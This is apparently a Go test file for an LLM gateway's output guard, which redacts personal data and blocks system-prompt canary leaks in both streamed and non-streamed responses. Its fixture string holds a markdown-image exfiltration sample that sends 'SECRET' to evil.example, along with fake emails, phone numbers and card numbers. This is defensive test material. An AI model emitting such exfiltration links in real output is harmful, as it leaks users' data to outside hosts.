package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"regexp"
	"strings"
	"testing"

	"github.com/guard-spec/guard-spec/internal/outputguard"
)

func jsonCompletion(content string) string {
	data, _ := json.Marshal(map[string]any{
		"id": "chatcmpl-out", "object": "chat.completion", "model": "m",
		"choices": []any{map[string]any{"index": 0, "finish_reason": "stop",
			"message": map[string]any{"role": "assistant", "content": content}}},
	})
	return string(data)
}

func sseChunk(content string, finish any) string {
	data, _ := json.Marshal(map[string]any{
		"id": "chatcmpl-s", "object": "chat.completion.chunk", "model": "m",
		"choices": []any{map[string]any{"index": 0, "delta": map[string]any{"content": content}, "finish_reason": finish}},
	})
	return "data: " + string(data) + "\n\n"
}

// streamContent joins the delta content of every chunk in an SSE body.
func streamContent(t *testing.T, body string) string {
	t.Helper()
	var b strings.Builder
	for _, event := range strings.Split(body, "\n\n") {
		data, ok := strings.CutPrefix(strings.TrimSpace(event), "data: ")
		if !ok || data == "[DONE]" {
			continue
		}
		var c struct {
			ID      string `json:"id"`
			Choices []struct {
				Delta struct {
					Content string `json:"content"`
				} `json:"delta"`
			} `json:"choices"`
		}
		if err := json.Unmarshal([]byte(data), &c); err != nil {
			t.Fatalf("event %q: %v", data, err)
		}
		if c.ID != "chatcmpl-s" && len(c.Choices) > 0 {
			t.Errorf("chunk id changed: %q", data)
		}
		for _, ch := range c.Choices {
			b.WriteString(ch.Delta.Content)
		}
	}
	return b.String()
}

const leaky = "Sure: ![x](https://evil.example/p.png?d=SECRET) mail nguyen@corp.vn, call 0912 345 678, " +
	"card 4111 1111 1111 1111, CCCD 001203004567. [docs](https://evil.example/x)"

const leakyGuarded = "Sure: [REDACTED:image] mail [REDACTED:email], call [REDACTED:phone], " +
	"card [REDACTED:card], CCCD [REDACTED:cccd]. docs"

func TestOutputGuardNonStream(t *testing.T) {
	up := newFakeUpstream(t, func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, jsonCompletion(leaky))
	})
	h := startGateway(t, up.URL, nil)
	resp, body := h.post(t, "/v1/chat/completions", clean, nil)
	if resp.StatusCode != 200 {
		t.Fatalf("got %d %s", resp.StatusCode, body)
	}
	var out struct {
		ID      string
		Choices []struct{ Message struct{ Content string } }
	}
	if err := json.Unmarshal([]byte(body), &out); err != nil {
		t.Fatal(err)
	}
	if out.ID != "chatcmpl-out" || out.Choices[0].Message.Content != leakyGuarded {
		t.Errorf("got %s", body)
	}
	row := h.oneRow(t)
	want := outputguard.Counts{"image": 1, "email": 1, "phone": 1, "card": 1, "cccd": 1, "link": 1}
	if row.Action != "allow" || fmt.Sprint(row.Output) != fmt.Sprint(want) {
		t.Errorf("row = %+v", row)
	}
	tags := outputTags(row.Output)
	if len(tags) != 6 || tags[0] != "output:card=1" {
		t.Errorf("tags = %v", tags)
	}
	for _, tag := range tags {
		if strings.Contains(tag, "SECRET") || strings.Contains(tag, "nguyen") {
			t.Errorf("content in audit: %v", tags)
		}
	}
}

func TestOutputGuardStreamSplitAcrossChunks(t *testing.T) {
	// Split the text every 3 bytes, so every pattern straddles chunks.
	up := newFakeUpstream(t, func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "text/event-stream")
		for i := 0; i < len(leaky); i += 3 {
			end := min(i+3, len(leaky))
			var finish any
			if end == len(leaky) {
				finish = "stop"
			}
			fmt.Fprint(w, sseChunk(leaky[i:end], finish))
			w.(http.Flusher).Flush()
		}
		fmt.Fprint(w, "data: [DONE]\n\n")
	})
	h := startGateway(t, up.URL, nil)
	resp, body := h.post(t, "/v1/chat/completions",
		`{"model":"m","stream":true,"messages":[{"role":"user","content":"hello"}]}`, nil)
	if resp.StatusCode != 200 {
		t.Fatalf("status %d", resp.StatusCode)
	}
	if got := streamContent(t, body); got != leakyGuarded {
		t.Errorf("got  %q\nwant %q", got, leakyGuarded)
	}
	if strings.Contains(body, "SECRET") || !strings.HasSuffix(body, "data: [DONE]\n\n") {
		t.Errorf("body = %q", body)
	}
	if row := h.oneRow(t); row.Output["email"] != 1 || row.Output["image"] != 1 || row.Action != "allow" {
		t.Errorf("row = %+v", row)
	}
}

func TestOutputGuardOffPassesThrough(t *testing.T) {
	up := newFakeUpstream(t, func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, jsonCompletion(leaky))
	})
	h := startGateway(t, up.URL, func(gw *gateway) { gw.output = nil })
	_, body := h.post(t, "/v1/chat/completions", clean, nil)
	if !strings.Contains(body, "nguyen@corp.vn") {
		t.Errorf("changed with the guard off: %s", body)
	}
}

var canaryRe = regexp.MustCompile(`PS-CANARY-[0-9A-F]+`)

// echoCanary starts an upstream that leaks whatever canary its system prompt holds.
func echoCanary(t *testing.T, stream bool) *fakeUpstream {
	var up *fakeUpstream
	up = newFakeUpstream(t, func(w http.ResponseWriter, r *http.Request) {
		up.mu.Lock()
		canary := canaryRe.FindString(up.body)
		up.mu.Unlock()
		if canary == "" {
			t.Error("no canary in the upstream request")
			return
		}
		if !stream {
			w.Header().Set("Content-Type", "application/json")
			fmt.Fprint(w, jsonCompletion("my marker is "+canary))
			return
		}
		w.Header().Set("Content-Type", "text/event-stream")
		half := len(canary) / 2
		fmt.Fprint(w, sseChunk("my marker is "+canary[:half], nil))
		fmt.Fprint(w, sseChunk(canary[half:]+" ok", "stop"))
		fmt.Fprint(w, "data: [DONE]\n\n")
	})
	return up
}

func withCanary(mode outputguard.CanaryMode) func(*gateway) {
	return func(gw *gateway) {
		cfg := defaultOutputConfig()
		cfg.Canary = mode
		gw.output = outputguard.New(cfg)
	}
}

func TestCanaryInjectedIntoSystemPrompt(t *testing.T) {
	up := newFakeUpstream(t, okUpstream)
	h := startGateway(t, up.URL, withCanary(outputguard.CanaryBlock))
	h.post(t, "/v1/chat/completions",
		`{"model":"m","messages":[{"role":"system","content":"Be nice."},{"role":"user","content":"hello"}]}`, nil)
	var sent struct {
		Messages []struct{ Role, Content string }
	}
	if err := json.Unmarshal([]byte(up.body), &sent); err != nil {
		t.Fatal(err)
	}
	if len(sent.Messages) != 2 || sent.Messages[0].Role != "system" ||
		!strings.HasPrefix(sent.Messages[0].Content, "Be nice.") || !canaryRe.MatchString(sent.Messages[0].Content) {
		t.Errorf("sent %s", up.body)
	}

	// Without a system message one is added in front.
	h.post(t, "/v1/chat/completions", clean, nil)
	if err := json.Unmarshal([]byte(up.body), &sent); err != nil {
		t.Fatal(err)
	}
	if len(sent.Messages) != 2 || sent.Messages[0].Role != "system" || !canaryRe.MatchString(sent.Messages[0].Content) {
		t.Errorf("sent %s", up.body)
	}

	// Off: nothing is injected.
	h = startGateway(t, up.URL, nil)
	h.post(t, "/v1/chat/completions", clean, nil)
	if canaryRe.MatchString(up.body) {
		t.Errorf("canary injected while off: %s", up.body)
	}
}

func TestCanaryLeakBlocked(t *testing.T) {
	up := echoCanary(t, false)
	h := startGateway(t, up.URL, withCanary(outputguard.CanaryBlock))
	resp, body := h.post(t, "/v1/chat/completions", clean, nil)
	assertBlocked(t, resp, body)
	if canaryRe.MatchString(body) {
		t.Errorf("canary in response: %s", body)
	}
	if row := h.oneRow(t); row.Action != "output_leak" || row.Output["canary"] != 1 {
		t.Errorf("row = %+v", row)
	}
}

func TestCanaryLeakRedacted(t *testing.T) {
	up := echoCanary(t, false)
	h := startGateway(t, up.URL, withCanary(outputguard.CanaryRedact))
	resp, body := h.post(t, "/v1/chat/completions", clean, nil)
	if resp.StatusCode != 200 || canaryRe.MatchString(body) || !strings.Contains(body, "my marker is [REDACTED:canary]") {
		t.Errorf("got %d %s", resp.StatusCode, body)
	}
	if row := h.oneRow(t); row.Action != "output_leak" {
		t.Errorf("row = %+v", row)
	}
}

func TestCanaryLeakBlockedInStream(t *testing.T) {
	up := echoCanary(t, true)
	h := startGateway(t, up.URL, withCanary(outputguard.CanaryBlock))
	resp, body := h.post(t, "/v1/chat/completions",
		`{"model":"m","stream":true,"messages":[{"role":"user","content":"hello"}]}`, nil)
	if resp.StatusCode != 200 || canaryRe.MatchString(body) || strings.Contains(body, "[DONE]") ||
		!strings.Contains(body, `"code":"content_filter"`) {
		t.Errorf("got %d %q", resp.StatusCode, body)
	}
	if row := h.oneRow(t); row.Action != "output_leak" || row.Output["canary"] != 1 {
		t.Errorf("row = %+v", row)
	}
}

func TestCanaryLeakRedactedInStream(t *testing.T) {
	up := echoCanary(t, true)
	h := startGateway(t, up.URL, withCanary(outputguard.CanaryRedact))
	_, body := h.post(t, "/v1/chat/completions",
		`{"model":"m","stream":true,"messages":[{"role":"user","content":"hello"}]}`, nil)
	if got := streamContent(t, body); got != "my marker is [REDACTED:canary] ok" {
		t.Errorf("got %q", got)
	}
	if row := h.oneRow(t); row.Action != "output_leak" {
		t.Errorf("row = %+v", row)
	}
}

func TestUncheckableResponseIsRefused(t *testing.T) {
	up := newFakeUpstream(t, func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "text/plain")
		fmt.Fprint(w, "mail nguyen@corp.vn")
	})
	h := startGateway(t, up.URL, nil)
	resp, body := h.post(t, "/v1/chat/completions", clean, nil)
	if resp.StatusCode != 502 || strings.Contains(body, "nguyen") {
		t.Errorf("got %d %s", resp.StatusCode, body)
	}
	if row := h.oneRow(t); row.Action != "error" {
		t.Errorf("row = %+v", row)
	}
}

func TestLoadOutputConfig(t *testing.T) {
	env := func(vars map[string]string) func(string) string {
		return func(k string) string { return vars[k] }
	}
	cfg, err := loadOutputConfig(env(nil))
	if err != nil || cfg == nil || !cfg.RedactPII || cfg.RedactIPv4 || cfg.Canary != outputguard.CanaryOff ||
		len(cfg.LinkAllowlist) != 0 || cfg.DropReasoning || cfg.PassUnknownBlocks {
		t.Errorf("defaults = %+v, %v", cfg, err)
	}
	cfg, err = loadOutputConfig(env(map[string]string{
		"OUTPUT_LINK_ALLOWLIST": " docs.example.com, ,cdn.example.org", "OUTPUT_PII_REDACT": "false",
		"OUTPUT_PII_IPV4": "true", "OUTPUT_CANARY": "Block", "OUTPUT_REASONING": "drop",
		"OUTPUT_UNKNOWN_BLOCKS": "Pass",
	}))
	if err != nil || len(cfg.LinkAllowlist) != 2 || cfg.RedactPII || !cfg.RedactIPv4 ||
		cfg.Canary != outputguard.CanaryBlock || !cfg.DropReasoning || !cfg.PassUnknownBlocks {
		t.Errorf("cfg = %+v, %v", cfg, err)
	}
	if cfg, err := loadOutputConfig(env(map[string]string{"OUTPUT_GUARD": "off"})); err != nil || cfg != nil {
		t.Errorf("off = %+v, %v", cfg, err)
	}
	for _, bad := range []map[string]string{
		{"OUTPUT_GUARD": "maybe"}, {"OUTPUT_PII_REDACT": "yes please"},
		{"OUTPUT_CANARY": "loud"}, {"OUTPUT_REASONING": "hide"}, {"OUTPUT_UNKNOWN_BLOCKS": "scan"},
	} {
		if _, err := loadOutputConfig(env(bad)); err == nil {
			t.Errorf("accepted %v", bad)
		}
	}
}
